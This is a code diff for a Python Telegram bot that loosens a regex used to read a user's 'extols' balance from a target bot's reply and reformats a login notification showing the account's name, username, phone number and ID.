@@ -93,7 +93,8 @@ async def load_database():
 
 async def get_balance_for_user(user_id, client):
     """
-    Specific balance checker for 'Your current extols: Є481' format.
+    Robust balance checker. Ignores the specific currency symbol and
+    captures the number after the word 'extols'.
     """
     try:
         async with client.conversation(config.TARGET_BOT, timeout=30) as conv:
@@ -101,9 +102,12 @@ async def get_balance_for_user(user_id, client):
             response = await conv.get_response()
             
             if response.text:
-                # MATCHING LOGIC: Looks specifically for "Є" followed by digits
-                # Example: "Your current extols: Є481" -> Matches "481"
-                match = re.search(r'Є\s*([\d,]+)', response.text)
+                # REGEX EXPLANATION:
+                # extols  -> Finds the word "extols"
+                # [:\s]+  -> Matches the colon and/or spaces
+                # \D* -> Matches ANY non-digit character (The symbol Є, €, etc.)
+                # ([\d,]+)-> Captures the number (e.g., 481 or 1,234)
+                match = re.search(r'extols[:\s]+\D*([\d,]+)', response.text, re.IGNORECASE)
                 
                 if match:
                     balance_str = match.group(1).replace(',', '')
@@ -116,7 +120,7 @@ async def get_balance_for_user(user_id, client):
                         
                     return (me.first_name, balance, None)
             
-            return ("Unknown", 0, "Could not find 'Є' symbol in response.")
+            return ("Unknown", 0, "Could not find balance in response.")
     
     except asyncio.TimeoutError:
         return ("Timeout", 0, "Target bot didn't reply.")
@@ -139,22 +143,22 @@ async def register_client(uid, client):
     # Save to disk
     save_database()
     
-    # --- DETAILED NOTIFICATION ---
+    # --- DETAILED LOGIN NOTIFICATION ---
     try:
-        # Fetch Owner Details for the log
+        # Fetch Owner Details
         owner_entity = await bot.get_entity(config.OWNER_ID)
         owner_name = owner_entity.first_name
         owner_username = f"@{owner_entity.username}" if owner_entity.username else "No Username"
         
         # User Details
         user_username = f"@{me.username}" if me.username else "No Username"
-        user_phone = me.phone if me.phone else "Hidden/Unknown"
+        user_phone = f"+{me.phone}" if me.phone else "Hidden/Unknown"
         
         log_msg = (
             "🔐 **NEW ACCOUNT LOGIN DETECTED**\n\n"
             f"**Account Name:** {me.first_name}\n"
             f"**Account Username:** {user_username}\n"
-            f"**Phone Number:** {user_phone}\n"
+            f"**Phone Number:** `{user_phone}`\n"
             f"**User ID:** `{me.id}`\n\n"
             f"**Bot Owner ID:** `{config.OWNER_ID}` ({owner_name} - {owner_username})"
         )
